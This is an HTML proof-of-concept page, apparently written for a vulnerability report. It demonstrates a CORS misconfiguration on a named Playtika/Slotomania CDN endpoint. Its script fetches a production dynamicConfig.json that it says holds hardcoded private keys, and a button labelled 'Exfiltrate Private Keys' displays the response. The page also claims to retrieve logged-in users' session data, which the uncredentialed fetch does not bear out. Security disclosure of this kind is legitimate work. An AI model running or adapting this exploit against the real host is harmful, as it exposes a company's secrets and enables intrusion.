<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Vulnerability PoC - Playtika</title>
    <style>
        :root {
            --primary: #ff4757;
            --bg: #0f172a;
            --card: #1e293b;
            --text: #f8fafc;
            --accent: #38bdf8;
        }

        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .container {
            background: var(--card);
            padding: 2rem;
            border-radius: 1rem;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
            max-width: 600px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        h1 {
            color: var(--primary);
            font-size: 1.5rem;
            margin-bottom: 1rem;
            display: flex;
            gap: 10px;
            align-items: center;
        }

        p {
            color: #94a3b8;
            line-height: 1.6;
        }

        .status {
            margin: 1.5rem 0;
            padding: 1rem;
            border-radius: 0.5rem;
            background: rgba(0, 0, 0, 0.2);
            font-family: monospace;
            font-size: 0.9rem;
            border-left: 4px solid var(--accent);
        }

        button {
            background: var(--primary);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 0.5rem;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
            width: 100%;
        }

        button:hover {
            transform: translateY(-2px);
            opacity: 0.9;
        }

        #result {
            margin-top: 1.5rem;
            background: #000;
            padding: 1rem;
            border-radius: 0.5rem;
            overflow-x: auto;
            white-space: pre-wrap;
            color: #4ade80;
            display: none;
            border: 1px solid #166534;
        }

        .loader {
            display: none;
            text-align: center;
            margin: 10px 0;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>🚨🚨 CORS PoC</h1>
        <p>This page demonstrates a cross-origin data exfiltration vulnerability on
            <strong>play.slotomania.com</strong>. If you are logged into Slotomania in this browser, clicking the button
            will attempt to retrieve your session data.
        </p>

        <div class="status" id="statusBox">Target: dynamicConfig.json (Production Secrets)</div>

        <button id="exploitBtn">Exfiltrate Private Keys</button>

        <div class="loader" id="loader">Exfiltrating Config Data...</div>
        <pre id="result"></pre>
    </div>

    <script>
        const exploitBtn = document.getElementById('exploitBtn');
        const resultPre = document.getElementById('result');
        const loader = document.getElementById('loader');
        const statusBox = document.getElementById('statusBox');

        exploitBtn.addEventListener('click', () => {
            loader.style.display = 'block';
            resultPre.style.display = 'none';
            exploitBtn.disabled = true;

            // Targeting the configuration file that contains hardcoded PRIVATE KEYS
            // This endpoint reflects Access-Control-Allow-Origin: *
            const targetUrl = "https://vs-mob-cdn.playtika.com/playtika/vs_fb_en_haxe/assets/dynamicConfig.json";

            fetch(targetUrl, {
                method: "GET",
                mode: "cors"
            })
                .then(response => {
                    statusBox.textContent = `Status: ${response.status} ${response.statusText}`;
                    return response.json();
                })
                .then(data => {
                    loader.style.display = 'none';
                    resultPre.style.display = 'block';
                    resultPre.textContent = JSON.stringify(data, null, 4);
                    exploitBtn.disabled = false;
                })
                .catch(error => {
                    loader.style.display = 'none';
                    resultPre.textContent = "Error: " + error.message + "\n\nNote: If you are seeing a CORS error here, it means the server blocked the specific origin of this PoC or the preflight failed.";
                    resultPre.style.display = 'block';
                    resultPre.style.color = '#f87171';
                    resultPre.style.borderColor = '#991b1b';
                    exploitBtn.disabled = false;
                });
        });
    </script>
</body>

</html>
